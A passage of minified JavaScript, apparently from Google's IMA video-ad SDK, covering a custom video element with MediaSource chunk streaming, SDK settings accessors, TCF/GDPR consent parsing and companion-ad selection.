    jx.prototype.attributeChangedCallback = function(a, b, c) {
        switch (a) {
            case "src":
                kx(this, c);
                break;
            case "demuxedaudiosrc":
            case "demuxedvideosrc":
                lx(this);
                break;
            case "muted":
                this.P[a] = "" === c ? !0 : !!c;
                mx(this, a, c);
                break;
            default:
                mx(this, a, c)
        }
    };
    var mx = function(a, b, c) {
            c !== a.P.getAttribute(b) && (null === c ? a.P.removeAttribute(b) : a.P.setAttribute(b, c))
        },
        nx = function(a) {
            a.ca && (a.P.removeEventListener("timeupdate", a.Hb), a.ca.W(), a.ca = null)
        },
        ox = function(a, b) {
            a.md = b;
            a.P.dispatchEvent(new Event("error"))
        },
        gx = function(a) {
            px(a);
            qx(a);
            a.P.addEventListener("loadedmetadata", function() {
                var b = a.P.videoWidth,
                    c = a.P.videoHeight,
                    d = qg(a),
                    e = d.width,
                    f = d.height;
                0 < b && 0 < c && 0 < e && 0 < f && (d = d.width / d.height, b /= c, .97 <= Math.min(b, d) / Math.max(b, d) ? ig(a.P, {
                        "object-fit": "cover"
                    }) :
                    ig(a.P, {
                        "object-fit": "contain"
                    }))
            });
            a.P.addEventListener("play", function() {
                a.Kd || (Iw(a.P, "first_play"), a.Kd = !0)
            });
            a.P.addEventListener("pause", function() {
                a.jc || (Iw(a.P, "first_pause"), Jw(a.P), a.jc = !0)
            });
            lj(u, "unload", function() {
                a.jc || (Iw(a.P, "first_pause"), Jw(a.P), a.jc = !0)
            });
            a.P.addEventListener("stalled", function() {
                I(J(), "ves", "1")
            });
            (new Xu(a.P)).O("playbackStalled", function() {
                return I(J(), "pbs", "1")
            });
            a.P.addEventListener("media_source_error", function(b) {
                nx(a);
                b = b.detail;
                ox(a, new ex(b.code, b.message))
            });
            rx(a)
        },
        ix = function(a) {
            var b = dx(a.childNodes);
            b && sx(a, b);
            null === a.Sb && tx(a)
        },
        tx = function(a) {
            if (u.MutationObserver) {
                var b = new MutationObserver(function(c) {
                    c = q(c);
                    for (var d = c.next(); !d.done; d = c.next())
                        if (d = d.value, "childList" === d.type && (d = dx(d.addedNodes))) {
                            sx(a, d);
                            b.disconnect();
                            break
                        }
                });
                b.observe(a, ax)
            }
        },
        hx = function(a) {
            a.P.addEventListener("volumechange", function() {
                a.tb.g.C(Lw.toString(), a.P.muted)
            })
        },
        sx = function(a, b) {
            if (null === a.Sb && b.hasAttribute("src")) {
                var c = b.getAttribute("src");
                a.Sb = new Ww(a.P,
                    c, b.hasAttribute("default"));
                new Tw(a.Sb, a.tb);
                c.includes("kind=asr") && I(J(), "act", "1")
            }
        },
        kx = function(a, b) {
            if (b !== a.Hd) {
                var c = (a.Hd = b) ? bu(b) : null,
                    d = !!c && uw(c);
                I(J(), "umsem", d ? "1" : "0");
                d ? (b = Bt(ww, b, cu(c), 1E3 * Ct[c], null), a.ca = Bt(zw, [b]), a.ca.O("media_source_error", function(e) {
                    e = du("media_source_error", e.detail);
                    a.P.dispatchEvent(e)
                }), a.Hb = function() {
                    var e = a.ca;
                    e.A = 1E3 * a.P.currentTime;
                    Bw(e)
                }, a.P.addEventListener("timeupdate", a.Hb), a.P.src = a.ca.l) : (nx(a), a.P.src = b);
                a.P.load()
            }
        },
        lx = function(a) {
            a.src &&
                ox(a, new ex(MediaError.MEDIA_ERR_ABORTED, "Setting demuxed src after src is already set."));
            if (!a.Bb && !a.pb && a.ca) nx(a), a.P.src = "about:blank", a.P.load();
            else if (a.Bb && a.pb) {
                var b = bu(a.Bb),
                    c = bu(a.pb);
                if (c && uw(c))
                    if (b && uw(b)) {
                        var d = !!c && uw(c) && !!b && uw(b);
                        I(J(), "umsed", d ? "1" : "0");
                        c = Bt(ww, a.pb, cu(c), -1, null);
                        b = Bt(ww, a.Bb, cu(b), -1, null);
                        a.ca = Bt(zw, [c, b]);
                        a.ca.O("media_source_error", function(e) {
                            e = du("media_source_error", e.detail);
                            a.P.dispatchEvent(e)
                        });
                        a.Hb = function() {
                            var e = a.ca;
                            e.A = 1E3 * a.P.currentTime;
                            Bw(e)
                        };
                        a.P.addEventListener("timeupdate", a.Hb);
                        a.P.src = a.ca.l;
                        a.P.load()
                    } else ox(a, new fx('Audio itag "' + b + '" not supported.'));
                else ox(a, new fx('Video itag "' + c + '" not supported.'))
            }
        },
        px = function(a) {
            for (var b = {}, c = q($w), d = c.next(); !d.done; b = {
                    za: b.za,
                    qc: b.qc
                }, d = c.next()) b.za = d.value, b.za in a.P && ("function" === typeof a.P[b.za] ? (b.qc = a.P[b.za].bind(a.P), Object.defineProperty(a, b.za, {
                set: function(e) {
                    return function(f) {
                        a.P[e.za] = f
                    }
                }(b),
                get: function(e) {
                    return function() {
                        return e.qc
                    }
                }(b)
            })) : Object.defineProperty(a,
                b.za, {
                    set: function(e) {
                        return function(f) {
                            a.P[e.za] = f
                        }
                    }(b),
                    get: function(e) {
                        return function() {
                            return a.P[e.za]
                        }
                    }(b)
                }))
        },
        qx = function(a) {
            Object.defineProperty(a, "error", {
                set: function() {},
                get: function() {
                    return a.P.error ? a.P.error : a.md
                }
            })
        },
        rx = function(a) {
            a.P.style.width = og();
            a.P.style.height = og()
        };
    da.Object.defineProperties(jx.prototype, {
        Bb: {
            configurable: !0,
            enumerable: !0,
            set: function(a) {
                this.setAttribute("demuxedaudiosrc", a)
            },
            get: function() {
                return this.getAttribute("demuxedaudiosrc")
            }
        },
        pb: {
            configurable: !0,
            enumerable: !0,
            set: function(a) {
                this.setAttribute("demuxedvideosrc", a)
            },
            get: function() {
                return this.getAttribute("demuxedvideosrc")
            }
        },
        src: {
            configurable: !0,
            enumerable: !0,
            set: function(a) {
                this.setAttribute("src", a)
            },
            get: function() {
                return this.getAttribute("src")
            }
        }
    });
    da.Object.defineProperties(jx, {
        observedAttributes: {
            configurable: !0,
            enumerable: !0,
            get: function() {
                return Zw
            }
        }
    });
    u.customElements && (u.customElements.get("lima-video") || u.customElements.define("lima-video", jx));

    function ux() {
        var a = Bt(cw);
        a.initialize().then(function(b) {
            b && (b = du("initialized"), a.dispatchEvent(b))
        });
        return a
    }
    var wx = function(a, b, c, d, e) {
        L.call(this);
        this.J = a;
        this.R = new P(b.url);
        this.h = c;
        this.o = e;
        this.H = b.g;
        this.ua = d;
        (this.V = b.h) || this.R.l.remove("alr");
        I(J(), "sl_dv" + this.o, (null != this.V).toString());
        this.X = !this.V;
        this.nb = 0;
        this.g = new XMLHttpRequest;
        this.$ = this.T = this.Ob = this.D = this.l = 0;
        this.Y = .1;
        this.C = [];
        this.M = !1;
        this.aa = this.sa = this.da = null;
        this.Va = !1;
        this.Pb = this.K = this.A = this.kb = this.ib = null;
        this.G = !1;
        if (this.B = ev()) this.A = ux(), Vi(this, this.A);
        vx(this)
    };
    t(wx, L);
    var xx = function(a, b) {
            b = du("media_source_error", b);
            a.J.dispatchEvent(b)
        },
        yx = function(a, b) {
            xx(a, {
                code: 1 < a.l ? MediaError.MEDIA_ERR_NETWORK : MediaError.MEDIA_ERR_SRC_NOT_SUPPORTED,
                message: b
            })
        },
        vx = function(a) {
            a.da = function() {
                zx(a);
                if (a.X) {
                    var b = a.g.responseText;
                    a.M = !b || b.length < a.H;
                    a.T = 0;
                    Ch("sl_cc" + a.o + "_" + a.l);
                    a.D++;
                    Ax(a)
                }
            };
            a.sa = function() {
                return zx(a)
            };
            a.aa = function() {
                Ch("sl_ec" + a.o + "_" + a.l);
                yx(a, "Failed to load chunk " + a.l + " for stream " + a.o)
            };
            a.g.addEventListener("load", a.da);
            a.g.addEventListener("progress",
                a.sa);
            a.g.addEventListener("error", a.aa);
            a.h.addEventListener("updateend", function() {
                a.h.buffered.length && (a.Ob = a.h.buffered.end(0), a.B ? a.G && !a.h.updating && a.l === a.D && (Ch("sl_lc" + a.o), a.ua()) : a.M && !a.h.updating && a.l === a.D && (Ch("sl_lc" + a.o), a.ua()));
                !a.Va && 1 < a.J.buffered.length && (I(J(), "dbr", "1"), a.Va = !0)
            });
            a.h.addEventListener("update", function() {
                a.C.length && !a.h.updating && a.h.appendBuffer(a.C.shift())
            });
            a.h.addEventListener("error", function() {
                Ch("msb_err" + a.o);
                xx(a, {
                    code: MediaError.MEDIA_ERR_DECODE,
                    message: "Error on SourceBuffer " + a.o
                })
            });
            a.B ? (dw(a.A) ? Bx(a) : a.ib = lj(a.A, "initialized", function() {
                Bx(a)
            }), a.kb = lj(a.A, "get_video_succeeded", function() {
                Ax(a)
            })) : Bx(a)
        },
        Dx = function(a) {
            Ch("sl_rc" + a.o + "-" + a.l);
            var b = Cx(a);
            a.g.open("get", b);
            a.g.overrideMimeType("text/plain; charset=x-user-defined");
            a.g.send(null);
            a.B && (a.K = null, a.Pb = b)
        },
        zx = function(a) {
            if (400 <= a.g.status) yx(a, 'Response code "' + a.g.status + '" on loading chunk ' + a.l + " for stream " + a.o);
            else {
                if (!a.X) {
                    var b = a.g.getResponseHeader("content-type");
                    if (b && 0 <= b.indexOf("text/plain")) {
                        a.g.readyState === XMLHttpRequest.DONE && (a.R = new P(a.g.response), a.l = 0, a.D = 0, a.nb++, Bx(a));
                        return
                    }
                    a.X = !0;
                    Ch("sl_redc" + a.o);
                    I(J(), "sl_tr" + a.o, a.nb.toString())
                }
                a.R.l.remove("alr");
                if (a.g.readyState === XMLHttpRequest.LOADING || a.g.readyState === XMLHttpRequest.DONE) b = Ex(a, a.T), a.T = a.g.response.length, a.$ += b.byteLength, Fx(a, b);
                if (a.B && a.g.readyState === XMLHttpRequest.DONE && (b = Ex(a, 0), 0 < b.byteLength)) {
                    var c = a.g.responseText;
                    a.G = !c || c.length < a.H;
                    lw(a.A, b, new P(a.Pb), a.G)
                }
            }
        },
        Fx =
        function(a, b) {
            0 < b.byteLength && (a.h.updating || a.C.length ? a.C.push(b) : a.h.appendBuffer(b))
        },
        Ex = function(a, b) {
            a = a.g.response;
            for (var c = new Uint8Array(a.length - b), d = 0; d < c.length; d++) c[d] = a.charCodeAt(d + b) & 255;
            return c.buffer
        },
        Ax = function(a) {
            var b = eu; - 1 != b && b < a.$ + a.H ? (a.J.pause(), eu = -1, b = !1) : (b = a.D === a.l && !a.h.updating && !a.C.length, b = a.B ? !a.G && b && a.J.currentTime >= a.Y : !a.M && b && a.J.currentTime >= a.Y);
            b && (a.Y = a.Ob + .1, Bx(a))
        },
        Cx = function(a) {
            var b = a.B && a.K ? a.K + 1 : a.l * a.H;
            return bt(a.R, "range", b + "-" + (b + a.H - 1)).toString()
        },
        Bx = function(a) {
            if (a.B) {
                var b = new P(Cx(a));
                jw(a.A, b).then(function(c) {
                    c ? (a.K = parseInt(c.endIndex, 10), a.G = c.isLastVideoChunk, Fx(a, c.video), c = du("get_video_succeeded"), a.A.dispatchEvent(c), a.D++) : Dx(a);
                    a.l++
                })
            } else Dx(a), a.l++
        };
    wx.prototype.N = function() {
        this.B && dw(this.A) && this.A.close();
        this.g.removeEventListener("load", this.da);
        this.g.removeEventListener("progress", this.sa);
        this.g.removeEventListener("error", this.aa);
        tj(this.ib);
        tj(this.kb);
        L.prototype.N.call(this)
    };
    var Hx = function(a, b) {
        L.call(this);
        var c = this;
        this.o = a;
        this.D = b;
        this.ca = new MediaSource;
        this.C = [];
        this.h = [];
        this.g = this.l = null;
        this.B = !1;
        this.A = function() {
            return Gx(c)
        };
        this.ca.addEventListener("sourceopen", this.A)
    };
    t(Hx, L);
    var Ix = function(a) {
            a.l && a.o.removeEventListener("timeupdate", a.l)
        },
        Gx = function(a) {
            Ch("msmsw_oso");
            a.l = function() {
                if (!a.B)
                    for (var e = q(a.h), f = e.next(); !f.done; f = e.next()) Ax(f.value)
            };
            a.o.addEventListener("timeupdate", a.l);
            for (var b = 0; b < a.D.length; b++) {
                var c = a.D[b];
                I(J(), "msmsw_mime" + b, c.mimeType);
                I(J(), "msmsw_cs" + b, c.g.toString());
                var d = a.ca.addSourceBuffer(c.mimeType);
                d ? (a.C.push(d), c = Bt(wx, a.o, c, d, function() {
                    a: if (!a.B) {
                        for (var e = q(a.h), f = e.next(); !f.done; f = e.next())
                            if (f = f.value, f.B ? !f.G || f.h.updating ||
                                f.C.length : !f.M || f.h.updating || f.C.length) break a;
                        a.ca.endOfStream();
                        a.B = !0;
                        Ix(a)
                    }
                }, b), a.h.push(c)) : Ch("msmsw_sbf" + b)
            }
            I(J(), "msmsw_ns", a.C.length.toString())
        };
    Hx.prototype.N = function() {
        this.g && window.URL.revokeObjectURL(this.g);
        for (var a = q(this.h), b = a.next(); !b.done; b = a.next()) b.value.W();
        Ix(this);
        this.ca.removeEventListener("sourceopen", this.A);
        L.prototype.N.call(this)
    };
    var Jx = function() {
        throw Error("Do not instantiate directly");
    };
    Jx.prototype.g = null;
    Jx.prototype.getContent = function() {
        return this.content
    };
    Jx.prototype.toString = function() {
        return this.content
    };
    var Kx = function() {
        Jx.call(this)
    };
    Za(Kx, Jx);
    var Lx = function(a) {
        function b(c) {
            this.content = c
        }
        b.prototype = a.prototype;
        return function(c, d) {
            c = new b(String(c));
            void 0 !== d && (c.g = d);
            return c
        }
    }(Kx);
    /*
     Copyright The Closure Library Authors.
     SPDX-License-Identifier: Apache-2.0
    */
    var Mx = function() {
        if (window.MutationObserver) {
            var a = [];
            (new MutationObserver(function() {
                a.forEach(function(b) {
                    return b()
                });
                a = []
            })).observe(document.createTextNode(""), {
                characterData: !0
            })
        }
    };
    "function" === typeof Promise && -1 < String(Promise).indexOf("[native code]") || Mx();
    var Nx = function(a) {
            this.g = a
        },
        Ox = function(a, b) {
            return Pb(a.g, b) && (a = a.g[b], "boolean" === typeof a) ? a : !1
        },
        Px = function(a) {
            if (Pb(a.g, "forceExperimentIds")) {
                a = a.g.forceExperimentIds;
                var b = [],
                    c = 0;
                Array.isArray(a) && a.forEach(function(d) {
                    "number" === typeof d && (b[c++] = d)
                });
                return b
            }
            return null
        };
    var V = function() {
            this.D = "always";
            this.M = 4;
            this.A = 1;
            this.g = 0;
            this.L = !0;
            this.o = "en";
            this.K = !1;
            this.V = this.T = "";
            this.B = null;
            this.Y = this.R = -1;
            this.X = this.J = this.I = "";
            this.G = !1;
            this.h = !0;
            this.C = At();
            this.H = {};
            try {
                this.aa = Il(void 0)[0]
            } catch (a) {}
        },
        Qx = function(a) {
            a = Zc(a);
            jc(a) || (a = a.substring(0, 20));
            return a
        };
    l = V.prototype;
    l.setCompanionBackfill = function(a) {
        this.D = a
    };
    l.getCompanionBackfill = function() {
        return this.D
    };
    l.setNumRedirects = function(a) {
        this.M = a
    };
    l.getNumRedirects = function() {
        return this.M
    };
    l.setPpid = function(a) {
        this.$ = a
    };
    l.getPpid = function() {
        return this.$
    };
    l.setVpaidAllowed = function(a) {
        "boolean" === typeof a && (this.A = a ? 1 : 0)
    };
    l.setVpaidMode = function(a) {
        this.A = a
    };
    l.getVpaidMode = function() {
        return this.A
    };
    l.setAutoPlayAdBreaks = function(a) {
        this.L = a
    };
    l.isAutoPlayAdBreaks = function() {
        return this.L
    };
    l.setIsVpaidAdapter = function(a) {
        this.K = a
    };
    l.Fb = function() {
        return this.K
    };
    l.setLocale = function(a) {
        if (a = Ju(a)) this.o = a
    };
    l.Ce = function() {
        return this.o
    };
    l.setPlayerType = function(a) {
        this.T = Qx(a)
    };
    l.getPlayerType = function() {
        return this.T
    };
    l.setPlayerVersion = function(a) {
        this.V = Qx(a)
    };
    l.getPlayerVersion = function() {
        return this.V
    };
    var Rx = function(a) {
        if (null == a.B) {
            var b = {},
                c = (new P(E().location.href)).l;
            if (gt(c, "tcnfp")) try {
                b = JSON.parse(c.get("tcnfp"))
            } catch (d) {}
            a.B = new Nx(b)
        }
        return a.B
    };
    l = V.prototype;
    l.setPageCorrelator = function(a) {
        this.R = a
    };
    l.setStreamCorrelator = function(a) {
        this.Y = a
    };
    l.setDisableCustomPlaybackForIOS10Plus = function(a) {
        this.G = a
    };
    l.getDisableCustomPlaybackForIOS10Plus = function() {
        return this.G
    };
    l.Qe = function() {
        return this.h
    };
    l.setCookiesEnabled = function(a) {
        null != a && (this.h = a)
    };
    l.setSessionId = function(a) {
        this.C = a
    };
    l.setDisableFlashAds = function() {};
    l.getDisableFlashAds = function() {
        return !0
    };
    l.setFeatureFlags = function(a) {
        this.H = a
    };
    l.getFeatureFlags = function() {
        return this.H
    };
    V.prototype.getFeatureFlags = V.prototype.getFeatureFlags;
    V.prototype.setFeatureFlags = V.prototype.setFeatureFlags;
    V.prototype.getDisableFlashAds = V.prototype.getDisableFlashAds;
    V.prototype.setDisableFlashAds = V.prototype.setDisableFlashAds;
    V.prototype.setSessionId = V.prototype.setSessionId;
    V.prototype.setCookiesEnabled = V.prototype.setCookiesEnabled;
    V.prototype.isCookiesEnabled = V.prototype.Qe;
    V.prototype.getDisableCustomPlaybackForIOS10Plus = V.prototype.getDisableCustomPlaybackForIOS10Plus;
    V.prototype.setDisableCustomPlaybackForIOS10Plus = V.prototype.setDisableCustomPlaybackForIOS10Plus;
    V.prototype.setStreamCorrelator = V.prototype.setStreamCorrelator;
    V.prototype.setPageCorrelator = V.prototype.setPageCorrelator;
    V.prototype.getPlayerVersion = V.prototype.getPlayerVersion;
    V.prototype.setPlayerVersion = V.prototype.setPlayerVersion;
    V.prototype.getPlayerType = V.prototype.getPlayerType;
    V.prototype.setPlayerType = V.prototype.setPlayerType;
    V.prototype.getLocale = V.prototype.Ce;
    V.prototype.setLocale = V.prototype.setLocale;
    V.prototype.isVpaidAdapter = V.prototype.Fb;
    V.prototype.setIsVpaidAdapter = V.prototype.setIsVpaidAdapter;
    V.prototype.isAutoPlayAdBreaks = V.prototype.isAutoPlayAdBreaks;
    V.prototype.setAutoPlayAdBreaks = V.prototype.setAutoPlayAdBreaks;
    V.prototype.getVpaidMode = V.prototype.getVpaidMode;
    V.prototype.setVpaidMode = V.prototype.setVpaidMode;
    V.prototype.setVpaidAllowed = V.prototype.setVpaidAllowed;
    V.prototype.getPpid = V.prototype.getPpid;
    V.prototype.setPpid = V.prototype.setPpid;
    V.prototype.getNumRedirects = V.prototype.getNumRedirects;
    V.prototype.setNumRedirects = V.prototype.setNumRedirects;
    V.prototype.getCompanionBackfill = V.prototype.getCompanionBackfill;
    V.prototype.setCompanionBackfill = V.prototype.setCompanionBackfill;
    var W = new V;
    var Sx = function(a) {
        B.call(this, a)
    };
    t(Sx, B);
    var Tx = function(a) {
            void 0 !== a.addtlConsent && "string" !== typeof a.addtlConsent && (a.addtlConsent = void 0);
            void 0 !== a.gdprApplies && "boolean" !== typeof a.gdprApplies && (a.gdprApplies = void 0);
            return void 0 !== a.tcString && "string" !== typeof a.tcString || void 0 !== a.listenerId && "number" !== typeof a.listenerId ? 2 : a.cmpStatus && "error" !== a.cmpStatus ? 0 : 3
        },
        Ux = function(a, b) {
            b = void 0 === b ? 500 : b;
            L.call(this);
            this.h = a;
            this.g = null;
            this.B = {};
            this.A = 0;
            this.o = b;
            this.l = null
        };
    t(Ux, L);
    Ux.prototype.N = function() {
        this.B = {};
        this.l && (gf(this.h, "message", this.l), delete this.l);
        delete this.B;
        delete this.h;
        delete this.g;
        L.prototype.N.call(this)
    };
    var Wx = function(a) {
            return "function" === typeof a.h.__tcfapi || null != Vx(a)
        },
        Zx = function(a, b) {
            var c = {
                    internalErrorState: 0
                },
                d = kb(function() {
                    return b(c)
                }),
                e = 0; - 1 !== a.o && (e = setTimeout(function() {
                e = 0;
                c.tcString = "tcunavailable";
                c.internalErrorState = 1;
                d()
            }, a.o));
            Xx(a, "addEventListener", function(f) {
                f && (c = f, c.internalErrorState = Tx(c), Yx(c) && (0 != c.internalErrorState && (c.tcString = "tcunavailable"), Xx(a, "removeEventListener", null, c.listenerId), e && (clearTimeout(e), e = 0), d()))
            })
        };
    Ux.prototype.addEventListener = function(a) {
        var b = {},
            c = kb(function() {
                return a(b)
            }),
            d = 0; - 1 !== this.o && (d = setTimeout(function() {
            b.tcString = "tcunavailable";
            b.internalErrorState = 1;
            c()
        }, this.o));
        var e = function(f, g) {
            clearTimeout(d);
            f ? (b = f, b.internalErrorState = Tx(b), g && 0 === b.internalErrorState || (b.tcString = "tcunavailable", g || (b.internalErrorState = 3))) : (b.tcString = "tcunavailable", b.internalErrorState = 3);
            a(b)
        };
        try {
            Xx(this, "addEventListener", e)
        } catch (f) {
            b.tcString = "tcunavailable", b.internalErrorState = 3, d && (clearTimeout(d),
                d = 0), c()
        }
    };
    Ux.prototype.removeEventListener = function(a) {
        a && a.listenerId && Xx(this, "removeEventListener", null, a.listenerId)
    };
    var Xx = function(a, b, c, d) {
            c || (c = function() {});
            if ("function" === typeof a.h.__tcfapi) a = a.h.__tcfapi, a(b, 2, c, d);
            else if (Vx(a)) {
                $x(a);
                var e = ++a.A;
                a.B[e] = c;
                a.g && (c = {}, a.g.postMessage((c.__tcfapiCall = {
                    command: b,
                    version: 2,
                    callId: e,
                    parameter: d
                }, c), "*"))
            } else c({}, !1)
        },
        Vx = function(a) {
            if (a.g) return a.g;
            a.g = Vf(a.h, "__tcfapiLocator");
            return a.g
        },
        $x = function(a) {
            a.l || (a.l = function(b) {
                try {
                    var c = ("string" === typeof b.data ? JSON.parse(b.data) : b.data).__tcfapiReturn;
                    a.B[c.callId](c.returnValue, c.success)
                } catch (d) {}
            }, ff(a.h,
                "message", a.l))
        },
        Yx = function(a) {
            if (!1 === a.gdprApplies) return !0;
            void 0 === a.internalErrorState && (a.internalErrorState = Tx(a));
            return "error" === a.cmpStatus || 0 !== a.internalErrorState || "loaded" === a.cmpStatus && ("tcloaded" === a.eventStatus || "useractioncomplete" === a.eventStatus) ? !0 : !1
        };

    function ay(a) {
        var b = {};
        (new P(a)).l.forEach(function(c, d) {
            b[d] = c
        });
        return b
    }
    var by = function(a) {
            this.Dd = a.isGdprLoader || !1;
            this.uspString = a.uspString || "";
            var b = a.gdprApplies;
            this.h = "boolean" == typeof b ? b ? "1" : "0" : "number" != typeof b || 1 !== b && 0 !== b ? "string" != typeof b || "1" !== b && "0" !== b ? "" : "1" == b ? "1" : "0" : 1 == b ? "1" : "0";
            this.g = a.tcString || "";
            /^[\.\w_-]*$/.test(this.g) || (this.g = encodeURIComponent(this.g))
        },
        cy = function(a, b) {
            a = void 0 === a ? {} : a;
            b = void 0 === b ? {} : b;
            this.g = a;
            this.h = new by(b)
        },
        dy = function(a, b) {
            var c = new P(a);
            var d = c.g;
            (c = ic(c.h, "googleads.g.doubleclick.net") && Gu("/pagead/(live/)?ads",
                d)) || (d = new Lu(a), c = d.h, d = Mu(d, d.g), c = !ic(c, ".g.doubleclick.net") && ic(c, "doubleclick.net") && Gu("/(ad|pfad)[x|i|j]?/", d));
            c || (c = new P(a), d = c.g, c = ic(c.h, "doubleclick.net") && Gu("/gampad/(live/)?ads", d));
            (c = c || "bid.g.doubleclick.net" == (new P(a)).h) || (c = new P(a), d = c.g, c = "ad.doubleclick.net" === c.h && Gu("/dv3/adv", d));
            c || (c = new P(a), d = c.g, "pubads.g.doubleclick.net" === c.h && (Gu("/ssai/", d) || Gu("/ondemand/", d)));
            return new cy(ay(a), b)
        },
        ey = function(a, b) {
            if (a.g.hasOwnProperty(b)) return a.g[b]
        },
        fy = function(a) {
            var b,
                c;
            if (!(b = "1" == (null == (c = ey(a, "ltd")) ? void 0 : c.toString()))) {
                var d;
                b = null == (d = ey(a, "gdpr")) ? void 0 : d.toString();
                d = a.h.h;
                d = ("1" == d || "0" == d ? d : void 0 != b ? b : "").toLowerCase();
                if ("true" === d || "1" === d)
                    if (d = a.h.g, a = ey(a, "gdpr_consent"), a = d && "tcunavailable" != d ? d : "tcunavailable" == d ? a || d : a || "", "tcunavailable" === a) var e = !1;
                    else {
                        if ((d = qs(a)) && a) {
                            var f = Ie(d, Ir, 1);
                            d = Ie(d, Br, 2) || new Br;
                            b = Ce(f, 9, 0);
                            c = Ce(f, 4, 0);
                            var g = Ce(f, 5, 0),
                                h = De(f, 10),
                                k = De(f, 11),
                                n = Ce(f, 16, ""),
                                m = De(f, 15),
                                v = {
                                    consents: rs(C(f, 13), ds),
                                    legitimateInterests: rs(C(f,
                                        14), ds)
                                },
                                r = {
                                    consents: rs(C(f, 17), void 0),
                                    legitimateInterests: rs(C(f, 18), void 0)
                                },
                                w = rs(C(f, 12), es),
                                x = Je(f, zr, 19);
                            f = {};
                            x = q(x);
                            for (var H = x.next(); !H.done; H = x.next()) {
                                H = H.value;
                                var ka = Ce(H, 1, 0);
                                f[ka] = f[ka] || {};
                                for (var Qa = q(C(H, 3)), Ad = Qa.next(); !Ad.done; Ad = Qa.next()) f[ka][Ad.value] = Ce(H, 2, 0)
                            }
                            a = {
                                tcString: a,
                                tcfPolicyVersion: b,
                                gdprApplies: !0,
                                cmpId: c,
                                cmpVersion: g,
                                isServiceSpecific: h,
                                useNonStandardStacks: k,
                                publisherCC: n,
                                purposeOneTreatment: m,
                                purpose: v,
                                vendor: r,
                                specialFeatureOptins: w,
                                publisher: {
                                    restrictions: f,
                                    consents: rs(C(d, 1), ds),
                                    legitimateInterests: rs(C(d, 2), ds),
                                    customPurposes: {
                                        consents: rs(C(d, 3)),
                                        legitimateInterests: rs(C(d, 4))
                                    }
                                }
                            }
                        } else a = null;
                        if (a) {
                            var Sa = void 0 === Sa ? !1 : Sa;
                            if (Yx(a))
                                if (!1 === a.gdprApplies || "tcunavailable" === a.tcString || void 0 === a.gdprApplies && !Sa || "string" !== typeof a.tcString || !a.tcString.length) e = !0;
                                else {
                                    e = void 0 === e ? "755" : e;
                                    c: {
                                        if (a.publisher && a.publisher.restrictions && (Sa = a.publisher.restrictions["1"], void 0 !== Sa)) {
                                            Sa = Sa[void 0 === e ? "755" : e];
                                            break c
                                        }
                                        Sa = void 0
                                    }
                                    0 === Sa ? e = !1 : a.purpose &&
                                        a.vendor ? (Sa = a.vendor.consents, (e = !(!Sa || !Sa[void 0 === e ? "755" : e])) && a.purposeOneTreatment && ("DE" === a.publisherCC || "CH" === a.publisherCC) ? e = !0 : e && (e = a.purpose.consents, e = !(!e || !e["1"]))) : e = !0
                                }
                            else e = !1
                        } else e = !1
                    }
                else e = !0;
                b = !e
            }
            return b
        };
    var gy = "platform platformVersion architecture model uaFullVersion bitness".split(" "),
        hy = function() {
            var a = window;
            return a.navigator && a.navigator.userAgentData && "function" === typeof a.navigator.userAgentData.getHighEntropyValues ? a.navigator.userAgentData.getHighEntropyValues(gy).then(function(b) {
                var c = new us;
                c = Ee(c, 1, b.platform);
                c = Ee(c, 2, b.platformVersion);
                c = Ee(c, 3, b.architecture);
                c = Ee(c, 4, b.model);
                c = Ee(c, 5, b.uaFullVersion);
                return Ee(c, 9, b.bitness)
            }) : null
        };
    var jy = function() {
            new cy;
            At();
            this.deviceId = "";
            this.g = this.referrer = null;
            iy(this)
        },
        ky = function() {
            G(jy);
            var a = "h.3.479.1";
            W.Fb() && (a += "/vpaid_adapter");
            return a
        },
        iy = function(a) {
            var b = hy();
            b && b.then(function(c) {
                a.g = $d(Ne(c))
            })
        };
    var ly = "abort canplay canplaythrough durationchange emptied loadstart loadeddata loadedmetadata progress ratechange seeked seeking stalled suspend waiting".split(" ");
    var ny = function(a) {
            var b = Rx(W);
            if (b && Ox(b, "forceCustomPlayback") || W.Fb()) return !0;
            if ((Dd || pu()) && a) return !1;
            a = a && (Dd || pu() || qu(10)) && (W.getDisableCustomPlaybackForIOS10Plus() || Sh(Hi));
            return (Cd || Ed) && !a || Bd && (!Bd || !ou(nu, 4)) || my() ? !0 : !1
        },
        oy = function(a) {
            return null == a ? !1 : W.Fb() ? !0 : Fd || Dd || pu() ? ru(a) ? Dd || pu() || qu(10) && W.getDisableCustomPlaybackForIOS10Plus() ? !1 : !0 : !0 : Bd && (!Bd || !ou(nu, 4)) || my() ? !0 : !1
        },
        py = function() {
            var a = Rx(W);
            return a && Ox(a, "disableOnScreenDetection") ? !1 : !Mm()
        },
        my = function() {
            var a;
            (a = Nm()) || (G(jy), a = !1);
            return a
        };
    var qy = function() {
            this.allowCustom = !0;
            this.creativeType = this.resourceType = "All";
            this.sizeCriteria = "SelectExactMatch";
            this.nearMatchPercent = 90;
            this.adSlotIds = []
        },
        ry = {
            IMAGE: "Image",
            FLASH: "Flash",
            ALL: "All"
        };
    y("module$contents$ima$CompanionAdSelectionSettings_CompanionAdSelectionSettings.CreativeType", ry, void 0);
    var sy = {
        HTML: "Html",
        IFRAME: "IFrame",
        STATIC: "Static",
        ALL: "All"
    };
    y("module$contents$ima$CompanionAdSelectionSettings_CompanionAdSelectionSettings.ResourceType", sy, void 0);
    var ty = {
        IGNORE: "IgnoreSize",
        SELECT_EXACT_MATCH: "SelectExactMatch",
        SELECT_NEAR_MATCH: "SelectNearMatch"
    };
    y("module$contents$ima$CompanionAdSelectionSettings_CompanionAdSelectionSettings.SizeCriteria", ty, void 0);
    var vy = function(a, b) {
            b = void 0 === b ? new qy : b;
            this.h = a;
            this.g = b ? b : new qy;
            this.A = uy(sy, this.g.resourceType) ? this.g.resourceType : "All";
            this.l = uy(ry, this.g.creativeType) ? this.g.creativeType : "All";
            this.C = uy(ty, this.g.sizeCriteria) ? this.g.sizeCriteria : "SelectExactMatch";
            this.o = null != this.g.adSlotIds ? this.g.adSlotIds : [];
            this.B = "number" === typeof this.g.nearMatchPercent && 0 < this.g.nearMatchPercent && 100 >= this.g.nearMatchPercent ? this.g.nearMatchPercent : 90
        },
        zy = function(a, b) {
            var c = [];
            b.forEach(function(d) {
                a.g.allowCustom &&
                    (!jc(d.getContent()) && (isNaN(d.g.sequenceNumber) || isNaN(d.g.mainAdSequenceNumber) || d.g.mainAdSequenceNumber == d.g.sequenceNumber) && wy(a, d) ? c.push(d) : (d = yy(a, d), null != d && !jc(d.getContent()) && c.push(d)))
            });
            return c
        },
        wy = function(a, b) {
            var c;
